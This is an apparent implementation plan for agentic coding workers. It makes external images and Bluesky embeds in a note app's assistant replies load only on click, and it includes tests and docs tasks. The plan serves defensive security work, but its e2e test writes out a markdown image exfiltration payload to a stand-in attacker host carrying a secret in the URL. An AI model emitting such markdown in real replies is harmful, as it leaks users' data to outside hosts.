# External Media Click-to-Load Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** No external image anywhere, and no Bluesky embed inside an
assistant reply, makes a network request until the user clicks it (pkm-tk9i).

**Architecture:** Each medium has one component every render path goes
through. `AssetImage` becomes a gate: an external `src` renders a placeholder
button, and only a click mounts the existing image body. `BlueskyEmbed`
becomes the same kind of gate, closed only when a new
`UntrustedContentContext` is true; `AssistantPanel` provides it around reply
rendering, so `((refs))` resolved inside a reply inherit it.

**Tech Stack:** React 18, TypeScript, vitest + Testing Library, Playwright.

**Spec:** `docs/superpowers/specs/2026-10-23-external-media-click-to-load-design.md`

## Global Constraints

- Work in worktree `.claude/worktrees/sec-tk9i`, branch `security/tk9i`.
  `web/node_modules` is a symlink to the main checkout's: never `git add -A`
  (add paths by name).
- External means any `src` not starting with `/assets/`. `data:` and `blob:`
  are external too: one rule.
- Image placeholder text: `image from <host>: <alt>`; `: <alt>` omitted when
  alt is empty; `external image` in place of `image from <host>` when the src
  has no parsable host (`new URL(src)` throws, or `.host` is empty).
- Bluesky placeholder text (builder's call, pinned here):
  `Bluesky post from <actor>`.
- A click loads only that one item. Nothing is remembered: a different
  `src`/`href`, or returning to an earlier one, needs its own click. No
  allow-list.
- Inside `InertMediaContext` a placeholder is plain text (`<span>`), not a
  button.
- `/assets/` images are unchanged: load on render, expand fullscreen.
- Bluesky embeds in notes are unchanged (Arthur's call).
- Web gate: `cd web && pnpm verify`. If another session may be running
  Playwright, set a distinct `E2E_PORT` (not 8974, 8977, 8978, 8979).
- New e2e specs create their own page (`POST /api/pages`) and delete it in
  `afterEach` (`DELETE /api/page/<title>`).
- Comment rules from AGENTS.md: no bean ids in code, test or
  `docs/architecture/` comments; comment lines at most 80 columns.

## Review Focus

1. **A one-frame fetch on src change.** A component that clicked image A and
   then re-renders with external src B must not commit an `<img src=B>` even
   for one render, because the browser starts fetching at commit. So the
   revealed state is compared against the current `src` during render, never
   reset in an effect. Pinned in Task 2 (`a new external src needs its own
   click`) and Task 3 (`a new href needs its own click`).
2. **The click entering edit mode.** A rendered block enters edit mode on a
   click in `.block-text`; the load button must stop propagation like
   `.asset-image-trigger` does. Pinned in Task 2 (unit) and Task 1's note test
   (`textarea.block-input` count 0 after the click).
3. **A `((ref))` resolved inside a reply.** The resolved block is the user's
   note, but it renders inside the reply and must inherit the untrusted
   context. Pinned in Task 3's `AssistantPanel` test.
4. **The handle lookup is the leak, not only the iframe.** `resolveHandle`
   runs from an effect on mount; the gate must keep the whole old body
   unmounted, so the effect never runs. Pinned in Task 3 (`fetch` not
   called before the click).
5. **Requests from the service worker.** The SW can issue a fetch the page
   does not; the e2e spec records and routes at the browser-context level,
   which Playwright reports for SW requests too in Chromium. Pinned in
   Task 1.

---

### Task 1: Red e2e spec, rebuilt from the review's reproduction

**Files:**
- Create: `web/e2e/external-media.spec.ts`

**Interfaces:**
- Produces: the accessible names later tasks must render:
  `image from attacker.invalid: citation`, `image from attacker.invalid: pic`,
  `Bluesky post from secret-tk9i.attacker.example`.

Header comment: what the spec proves (no request to an external host until
the click; the review's High finding), and that FakeEngine replies
`echo: <user text>`, so sending the markdown is enough to render it (see
`assistant-asset-link.spec.ts`). Reuse that file's `login` and `askInput`
helpers by copying them, as the other specs do.

- [ ] **Step 1: Write the shared recording and routing**

In each test, before `login`:

- `const external: string[] = []` filled by
  `context.on("request", …)` with every `http:`/`https:` request URL whose
  origin is not the app's (take the test's `baseURL` fixture and
  `new URL(baseURL!).origin`). If an
  unrelated external origin shows up during a run, stop and report it; do
  not filter it out.
- `context.route("https://attacker.invalid/**", …)` fulfils a 1×1 PNG
  (`image/png`, a base64 constant in the file).
- `context.route("**/xrpc/com.atproto.identity.resolveHandle*", …)` fulfils
  `{ json: { did: "did:plc:tq6gqh5aaohgi55y2yofylwj" } }`.
- `context.route("https://embed.bsky.app/**", …)` fulfils
  `<html><body>post</body></html>` as `text/html`.

Route on `context`, not `page`: that is what catches service-worker fetches.

- [ ] **Step 2: Write the assistant-reply test**

`test("an assistant reply's external image and Bluesky post fetch nothing until clicked", …)`:

1. Login, `/`, `Control+j`, panel visible.
2. Send `![citation](https://attacker.invalid/collect?note=SECRET-tk9i)`;
   wait for the first `.assistant-msg-assistant` to be visible.
3. Send `https://bsky.app/profile/secret-tk9i.attacker.example/post/3mp4jonwrfk2h`;
   wait for the second `.assistant-msg-assistant`.
4. `await expect(panel.locator("img, iframe")).toHaveCount(0)` — the
   security assertion, first, so the red run fails on it.
5. `expect(external).toEqual([])`.
6. Click button `image from attacker.invalid: citation`;
   `await expect.poll(() => external).toEqual(["https://attacker.invalid/collect?note=SECRET-tk9i"])`;
   `panel.getByRole("img", { name: "citation" })` visible.
7. Click button `Bluesky post from secret-tk9i.attacker.example`;
   poll until `external` holds a `resolveHandle` URL; then
   `panel.locator("iframe.bluesky-embed")` visible.

- [ ] **Step 3: Write the note test**

`test("a note's external image waits for a click; its Bluesky post still embeds", …)`:

1. Login. Title `ExternalMedia${Date.now()}`; `POST /api/pages`, then
   `POST /api/ops` (same body shape as `assistant-asset-link.spec.ts`) with
   two `create` ops: order 0 `![pic](https://attacker.invalid/note.png)`,
   order 1 `https://bsky.app/profile/cpaxton.bsky.social/post/3mp4jonwrfk2h`.
2. `page.goto(\`/page/${encodeURIComponent(title)}\`)`.
3. `page.locator("iframe.bluesky-embed")` visible (notes keep embedding).
4. `await expect(page.locator("img.asset-image")).toHaveCount(0)`;
   `expect(external.filter((u) => u.includes("attacker.invalid"))).toEqual([])`.
5. Click button `image from attacker.invalid: pic`; poll the attacker
   requests to equal `["https://attacker.invalid/note.png"]`;
   `page.getByRole("img", { name: "pic" })` visible;
   `await expect(page.locator("textarea.block-input")).toHaveCount(0)`.

`test.afterEach` deletes the page if its title was set.

- [ ] **Step 4: Run it and confirm it fails for the security reason**

Run: `cd web && E2E_PORT=8975 pnpm e2e e2e/external-media.spec.ts`
(`pnpm e2e` builds first, so the run never tests a stale `dist`).
Expected: both tests FAIL at the `toHaveCount(0)` assertion (an `img` exists
and requested `attacker.invalid`). A failure anywhere earlier (login,
reply never rendered, page create) means the spec is wrong: fix it before
going on. Record the failure lines for the task report.

- [ ] **Step 5: Commit**

```bash
git add web/e2e/external-media.spec.ts
git commit -m "test: external media in replies and notes fetches nothing until clicked (red)"
```

### Task 2: `AssetImage` gates external images

**Files:**
- Create: `web/src/components/externalMedia.ts`, `web/src/components/externalMedia.test.ts`
- Modify: `web/src/components/AssetImage.tsx`, `web/src/components/AssetImage.test.tsx`, `web/src/styles.css`

**Interfaces:**
- Produces: `isUploadedAsset(src: string): boolean` and
  `externalImageLabel(src: string, alt: string): string` in
  `externalMedia.ts` (`// pattern: Functional Core`); CSS class
  `.external-media-placeholder` (Task 3 reuses it).

- [ ] **Step 1: Write the core tests** (`externalMedia.test.ts`)

```ts
it("treats only /assets/ paths as uploaded", () => {
  expect(isUploadedAsset("/assets/a/b.png")).toBe(true);
  for (const src of ["https://h.test/assets/a.png", "//evil.test/assets/x.png",
    "/assetsx/y.png", "assets/a.png", "data:image/png;base64,AA", "blob:x"]) {
    expect(isUploadedAsset(src)).toBe(false);
  }
});
it("labels an external image by host and alt", () => {
  expect(externalImageLabel("https://attacker.invalid/c?q=1", "cite"))
    .toBe("image from attacker.invalid: cite");
  expect(externalImageLabel("https://h.test:8080/x.png", ""))
    .toBe("image from h.test:8080");
});
it("falls back to 'external image' without a parsable host", () => {
  expect(externalImageLabel("not a url", "a")).toBe("external image: a");
  expect(externalImageLabel("data:image/png;base64,AAAA", "")).toBe("external image");
  expect(externalImageLabel("//evil.test/x.png", "")).toBe("external image");
});
```

- [ ] **Step 2: Write the component tests** (`AssetImage.test.tsx`)

Change the two existing tests that render `https://example.test/photo.png`
to click `image from example.test: external` first, then keep their
assertions. Add:

- `renders an external image as a load button with no img until clicked`:
  `document.querySelector("img")` is null; button
  `image from example.test: external` exists; after click,
  `getByRole("img", { name: "external" })` has the src.
- `a new external src needs its own click`: click on A
  (`https://a.test/x.png`), rerender B (`https://b.test/y.png`):
  `document.querySelector("img")` null and button `image from b.test: …`;
  rerender A: still no img (nothing remembered).
- `the load click does not reach ancestors`: parent `onClick` spy not called.
- `an external image inside InertMediaContext is plain text`:
  `queryByRole("button")` null, `getByText("image from example.test: x")`,
  no img.

- [ ] **Step 3: Run them and confirm they fail**

Run: `cd web && pnpm vitest run src/components/externalMedia.test.ts src/components/AssetImage.test.tsx`
Expected: FAIL (module missing; img rendered without a click).

- [ ] **Step 4: Implement**

- `externalMedia.ts`: the two functions; move `isUploadedAsset` out of
  `AssetImage.tsx`.
- `AssetImage.tsx`: rename the current component body to an unexported
  `LoadedImage({ src, alt })`, unchanged. The exported
  `AssetImage({ src, alt })` holds `const [revealed, setRevealed] =
  useState<string | null>(null)`. During render, if `revealed !== null &&
  revealed !== src`, call `setRevealed(null)` (the adjust-state-in-render
  pattern `BlueskyEmbed` uses for `heightKey`); an external src renders
  `<LoadedImage>` only when `revealed === src`. Otherwise it renders the
  placeholder: in `InertMediaContext` a
  `<span className="asset-image-placeholder external-media-placeholder">`,
  else a `<button type="button">` with the same classes whose `onClick`
  calls `event.stopPropagation()` then `setRevealed(src)`. Text is
  `externalImageLabel(src, alt)`. Uploaded assets go straight to
  `<LoadedImage>`. Update the header comment to state the rule and why (an
  image URL is an outbound channel for anything that can write markdown the
  app renders, the assistant included).
- `styles.css`, beside `.asset-image-placeholder`:
  `button.external-media-placeholder` resets the button (`appearance: none`,
  `background: none`, `width: 100%`, `text-align: left`, `font-family:
  inherit`, `cursor: pointer`) so it looks like the existing dashed
  placeholder, and its own `:focus-visible` ring per `styling.md` § Focus.

- [ ] **Step 5: Run the tests, then the e2e spec**

Run: `cd web && pnpm vitest run src/components/externalMedia.test.ts src/components/AssetImage.test.tsx`
Expected: PASS.
Run the Task 1 spec as in Task 1 Step 4. Expected: the note test PASSES;
the reply test now fails only at step 7 (no Bluesky button).

- [ ] **Step 6: Commit**

```bash
git add web/src/components/externalMedia.ts web/src/components/externalMedia.test.ts \
  web/src/components/AssetImage.tsx web/src/components/AssetImage.test.tsx web/src/styles.css
git commit -m "AssetImage: external images load on click"
```

### Task 3: Bluesky embeds in assistant replies load on click

**Files:**
- Modify: `web/src/contexts.ts`, `web/src/components/BlueskyEmbed.tsx`,
  `web/src/components/BlueskyEmbed.test.tsx`,
  `web/src/assistant/AssistantPanel.tsx`,
  `web/src/assistant/AssistantPanel.test.tsx`

**Interfaces:**
- Consumes: `.external-media-placeholder` (Task 2).
- Produces: `export const UntrustedContentContext = createContext(false)` in
  `contexts.ts`, beside `InertMediaContext`, with a doc comment: true under
  text a third party or model may have written (assistant replies); media
  that would fetch on render instead waits for a click.

- [ ] **Step 1: Write the tests**

`BlueskyEmbed.test.tsx` (wrap renders in
`<UntrustedContentContext.Provider value={true}>`):

- `in untrusted content a handle post fetches nothing until clicked`:
  `stubResolve({ ok: true, did: DID })`; href
  `https://bsky.app/profile/alice.bsky.social/post/3k2abc123xy`;
  `fetchMock` not called and `embedSrc(container)` null; button
  `Bluesky post from alice.bsky.social`; click; `fetchMock` called once;
  `await waitFor` iframe present.
- `in untrusted content a DID post renders no iframe until clicked` (the DID
  path has no fetch, but the iframe itself loads embed.bsky.app).
- `a new href needs its own click`: as Task 2's rule, with two handle hrefs.
- `in untrusted, inert content the placeholder is plain text`: both providers
  true; no button, text present, no fetch.

`AssistantPanel.test.tsx`, following the `((uid)) block ref … resolves`
test:

- `a reply's media waits for a click, including inside a resolved ((ref))`:
  `/api/block-refs` returns `chart1` with text
  `https://bsky.app/profile/alice.bsky.social/post/3k2abc123xy`; the item
  text is `see ((chart1)) and ![x](https://attacker.invalid/a.png)`. Assert
  button `image from attacker.invalid: x`, and after the ref resolves,
  button `Bluesky post from alice.bsky.social`; `document.querySelector("img,
  iframe")` null; no `fetch` call to `public.api.bsky.app`.

- [ ] **Step 2: Run them and confirm they fail**

Run: `cd web && pnpm vitest run src/components/BlueskyEmbed.test.tsx src/assistant/AssistantPanel.test.tsx`
Expected: FAIL (context missing; iframe/fetch without a click).

- [ ] **Step 3: Implement**

- `contexts.ts`: the context above.
- `BlueskyEmbed.tsx`: rename the current body to an unexported
  `BlueskyEmbedFrame({ href })`, unchanged. Exported `BlueskyEmbed({ href })`
  reads `UntrustedContentContext` and `InertMediaContext`; returns null when
  `parseBlueskyPostUrl(href)` is null; when untrusted, holds the same
  revealed-by-key state as Task 2 (keyed on `href`, cleared during render)
  and renders the placeholder (span when inert, button otherwise, click
  stops propagation) until revealed; otherwise renders `<BlueskyEmbedFrame>`.
  The gate must keep `BlueskyEmbedFrame` unmounted, so `resolveHandle`'s
  effect never runs: the handle lookup is itself the leak (Bluesky's
  servers resolve the handle's domain). Say so in the comment.
- `AssistantPanel.tsx`: wrap the `<BlockRefProvider seed={{}}>` in
  `<UntrustedContentContext.Provider value={true}>`, with a one-line comment
  saying why.

- [ ] **Step 4: Run the unit tests and the e2e spec**

Run: `cd web && pnpm vitest run src/components/BlueskyEmbed.test.tsx src/assistant/AssistantPanel.test.tsx`
Expected: PASS. Run the Task 1 spec. Expected: both tests PASS.

- [ ] **Step 5: Commit**

```bash
git add web/src/contexts.ts web/src/components/BlueskyEmbed.tsx \
  web/src/components/BlueskyEmbed.test.tsx web/src/assistant/AssistantPanel.tsx \
  web/src/assistant/AssistantPanel.test.tsx
git commit -m "assistant: Bluesky embeds in replies load on click"
```

### Task 4: Docs, full gate, bean

**Files:**
- Modify: `docs/architecture/frontend-rendering.md` (§ Link safety and lazy
  loading), `docs/architecture/frontend.md` (§ The assistant panel),
  `docs/architecture/styling.md`, `docs/troubleshooting.md` (§ Assistant),
  `.beans/pkm-tk9i*.md`

- [ ] **Step 1: Update the docs** (invoke the `architecture-docs` skill)

- `frontend-rendering.md`: retitle the section "Link safety and external
  media" and state the rule with its reason: external images load on click
  everywhere and Bluesky embeds under `UntrustedContentContext`, because a
  rendered URL is an outbound channel that needs no click or write approval;
  the gate keeps the fetching component unmounted. Fix the lazy-loading
  sentence, which no longer covers external images.
- `frontend.md` § The assistant panel: one bullet: replies render under
  `UntrustedContentContext`, and what it changes. If the rendering table in
  `frontend-rendering.md` row `image` needs no change, leave it.
- `styling.md`: one line naming `button.external-media-placeholder` as the
  button styled to look like `.asset-image-placeholder`.
- `troubleshooting.md` § Assistant: one row: symptom "an image or Bluesky
  post in an assistant reply requests its URL with no click (security
  review 2026-10-23, High)"; cause; Where = the `frontend-rendering.md`
  section; Ref = pkm-tk9i.

- [ ] **Step 2: Full web gate**

Run: `cd web && set -o pipefail && E2E_PORT=8975 pnpm verify 2>&1 | tail -40`
Expected: exit 0 (typecheck, eslint, `lint:comments`, `check:fcis`, unit
coverage, full Playwright).

- [ ] **Step 3: Tick the bean**

Check off the three remaining items in pkm-tk9i; append
`## Summary of Changes`. Leave the status in-progress: the perf gate,
merge and deploy follow in the main loop.

- [ ] **Step 4: Commit**

```bash
git add docs/architecture/frontend-rendering.md docs/architecture/frontend.md \
  docs/architecture/styling.md docs/troubleshooting.md .beans/
git commit -m "docs: external media loads on click (pkm-tk9i)"
```

## After the tasks (main loop, not an implementer)

1. Opus task reviews, then an adversarial opus reviewer told to find any
   render path that still fetches an external URL without a click: KaTeX
   (`\href`, `\includegraphics`, `trust`), mermaid (images or links in
   labels), the GoodLinks reader iframe's `srcdoc`, `<a>` prefetch or
   speculation rules, `srcset`, CSS `url()` in rendered content, link
   previews, the service worker, `PdfEmbed`, the `/files` grid. Ask them to
   re-run the key mutations themselves in a detached throwaway worktree.
2. `perf/check.sh frontend` on the branch.
3. Merge `--no-ff`, deploy with `CI=true ~/.config/pkm/app/deploy/update.sh`,
   verify the served bundle under `/app-assets/` contains
   `external-media-placeholder`, then complete the bean.
